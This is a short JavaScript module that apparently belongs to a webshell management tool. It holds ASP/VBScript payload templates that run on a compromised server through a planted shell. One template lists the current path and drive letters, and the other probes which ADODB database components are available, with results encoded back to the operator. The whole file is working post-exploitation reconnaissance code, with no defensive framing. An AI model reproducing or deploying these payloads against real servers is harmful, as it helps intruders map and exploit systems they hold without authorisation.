/**
 * 基础信息模板
 * ? 获取当前路径、盘符列表
 */

module.exports = () => ({
  info: {
    _: `Dim S:SET C=CreateObject("Scripting.FileSystemObject"):If Err Then:S="ERROR:// "&Err.Description:Err.Clear:Else:S=Server.Mappath(".")&chr(9):For Each D in C.Drives:S=S&D.DriveLetter&chr(58):Next:End If:Response.Write(encode(S))`
  },
  probedb: // 检测数据库函数支持
  {
    _: `Function fe(strobj):
    on error resume next:
    fe=0:
    server.CreateObject(strobj):
    If -2147221005 <> Err then:fe=1:End If:
    End Function:
    m="Adodb.Connection|Adodb.RecordSet":
    m=split(m,"|"):
    for i=0 to ubound(m):
    Response.Write(encode(m(i)&chr(9)&fe(m(i)))&chr(64)):
    next:`.replace(/\n\s+/g, '')
  },
})